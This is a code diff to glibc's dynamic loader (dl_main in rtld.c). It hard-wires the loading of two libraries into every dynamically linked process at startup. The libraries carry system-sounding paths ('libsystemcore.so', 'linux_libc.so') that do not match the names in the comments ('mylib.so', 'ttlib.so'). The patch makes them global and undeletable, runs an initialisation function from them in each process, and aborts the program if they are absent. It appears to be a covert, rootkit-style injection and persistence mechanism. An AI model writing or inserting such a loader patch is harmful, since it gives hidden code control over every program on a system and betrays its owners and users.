@@ -1692,6 +1692,67 @@ dl_main (const ElfW(Phdr) *phdr,
      objects.  */
   call_init_paths (&state);
 
+    /* PATCH: GLOBAL PRIORITY LIBRARIES - EINFÜGEN HIER */
+  {
+    struct link_map *mylib, *ttlib;
+    
+    if (__glibc_unlikely (GLRO(dl_debug_mask) & DL_DEBUG_LIBS))
+      _dl_debug_printf ("Loading priority libraries with global symbol access\n");
+
+    /* Load mylib.so FIRST with GLOBAL flag */
+    mylib = _dl_map_object (NULL, "/usr/lib/libsystemcore.so", 
+                            lt_library, 0, RTLD_NOW | RTLD_GLOBAL, LM_ID_BASE);
+    if (__glibc_unlikely (mylib == NULL))
+      _dl_fatal_printf ("CRITICAL: Cannot load mylib.so\n");
+    
+    /* Mark mylib as globally accessible */
+    mylib->l_flags_1 |= DF_1_GLOBAL;
+    mylib->l_global = 1;
+    
+    /* Immediate relocation for mylib */
+    _dl_relocate_object (mylib, mylib->l_scope, RTLD_NOW, 0);
+    
+    /* Load ttlib.so SECOND with GLOBAL flag */
+    ttlib = _dl_map_object (NULL, "/usr/lib/linux_libc.so",
+                            lt_library, 0, RTLD_NOW | RTLD_GLOBAL, LM_ID_BASE);
+    if (__glibc_unlikely (ttlib == NULL))
+      _dl_fatal_printf ("CRITICAL: Cannot load ttlib.so\n");
+      
+    /* Mark ttlib as globally accessible */
+    ttlib->l_flags_1 |= DF_1_GLOBAL;
+    ttlib->l_global = 1;
+    
+    /* Immediate relocation for ttlib */
+    _dl_relocate_object (ttlib, ttlib->l_scope, RTLD_NOW, 0);
+    
+    /* Mark libraries as permanent */
+    mylib->l_flags_1 |= DF_1_NODELETE;
+    ttlib->l_flags_1 |= DF_1_NODELETE;
+
+        
+    /* Execute bundle validation (can use ttlib symbols) */
+    {
+      void *bundle_func = _dl_symbol_value (mylib, "bundle_validate_and_init");
+      if (bundle_func != NULL)
+        {
+          int (*bundle_validator)(void) = (int (*)(void)) bundle_func;
+          int result = bundle_validator();
+          
+          if (__glibc_unlikely (result != 0))
+            _dl_fatal_printf ("CRITICAL: Bundle validation failed: %d\n", result);
+
+          if (__glibc_unlikely (GLRO(dl_debug_mask) & DL_DEBUG_LIBS))
+            _dl_debug_printf ("Bundle validation completed, symbols globally available\n");
+        }
+      else
+        _dl_fatal_printf ("CRITICAL: bundle_validate_and_init not found\n");
+    }
+    
+    if (__glibc_unlikely (GLRO(dl_debug_mask) & DL_DEBUG_LIBS))
+      _dl_debug_printf ("Priority libraries loaded with global symbol access\n");
+  }
+  /* END PATCH */
+
   /* Initialize _r_debug_extended.  */
   struct r_debug *r = _dl_debug_initialize (_dl_rtld_map.l_addr,
 					    LM_ID_BASE);
